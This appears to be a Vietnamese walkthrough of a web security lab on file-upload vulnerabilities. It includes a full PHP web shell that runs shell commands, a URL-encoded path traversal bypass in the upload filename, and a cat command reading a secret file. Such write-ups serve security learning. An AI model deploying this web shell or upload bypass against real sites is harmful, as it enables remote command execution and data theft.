<img width="1002" height="615" alt="image" src="https://github.com/user-attachments/assets/771f653c-94a6-4b04-bd45-197b1c671ec6" />

# Tổng quan

Đầu tiên ta đăng nhập với tài khoản wiener và mật khẩu peter được cấp từ trước

Sau khi đăng nhập,ta thấy có chức năng Upload Avatar có khả năng là File Upload Vuln

Mục tiêu của ta là đọc được nội dung của `/home/carlos/secret`
# Khai thác

Ta thử với exploit.php

```PHP
<html>

<body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
        <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
    </form>
    <pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
   
?>
</pre>
</body>

</html>
```
<img width="1683" height="893" alt="image" src="https://github.com/user-attachments/assets/00f3d88a-5ac6-466b-9647-fa6e21540258" />

Ta thấy rằng dường như ta có thể up file .php lên.Giờ ta sẽ truy cập vào file exploit.php qua path `files/avatars/exploit.php`

<img width="1701" height="964" alt="image" src="https://github.com/user-attachments/assets/c3f08c7b-e879-423e-a34d-f8e2d05487d7" />

Tuy nhiên trang web đã chặn thực thi file exploit.php ta cần tìm cách khác

Ta chuyển qua Burp Proxy,ở phần Intercept ta bật lên để chặn request:

<img width="1706" height="949" alt="image" src="https://github.com/user-attachments/assets/663698a5-4a47-46bd-8bef-e9a5ef8b50ea" />

Ở phần value của filename ta thử test với path traversal thêm ../ ở phía trước 

<img width="1706" height="911" alt="image" src="https://github.com/user-attachments/assets/ab8a518b-6fc7-4af9-bbbc-f50c84550c94" />

Ta forward và xem kết quả

<img width="1706" height="911" alt="image" src="https://github.com/user-attachments/assets/a8092daf-72fe-4dc9-b64c-f51524f2fac4" />

Nhưng có vẻ như trang web đã phản hồi The file avatars/exploit.php has been uploaded thì ta có thể hiểu trang web đã loại bỏ ../

Ta sẽ thử URL encoding với ký tự `../` xem có điều gì xảy ra 

<img width="1706" height="913" alt="image" src="https://github.com/user-attachments/assets/9ebc6b85-ed7d-4417-a540-5d74f85bbc4c" />

Ta forward và xem kết quả

<img width="1706" height="974" alt="image" src="https://github.com/user-attachments/assets/f1d86b4e-2bd7-4522-9d84-30929aa668b5" />

Vậy ta thành công upload ../exploit.php giờ ta sẽ truy cập vào file exploit.php qua path `/files/avatars/../exploit.php`

<img width="1704" height="966" alt="image" src="https://github.com/user-attachments/assets/34d2f535-9cdb-4112-b1a2-a7a4dde0f406" />

Vậy là ta thành công truy cập file `exploit.php`

Tiếp theo ta dùng linux command để đọc nội dung file:

```linux
cat /home/carlos/secret
```

<img width="1706" height="974" alt="image" src="https://github.com/user-attachments/assets/8711f42a-cd16-4df6-a6e7-676495134f51" />

Vậy là ta đọc được nội dung của `/home/carlos/secret` là h2pwnVAFAMVscigjjxG0zBv0GKyrTIK7

Việc còn lại của ta là submit rồi hoàn thành lab

<img width="1689" height="924" alt="image" src="https://github.com/user-attachments/assets/62249798-9247-487e-a1a7-0baf1b6d3611" />

=> Solved!
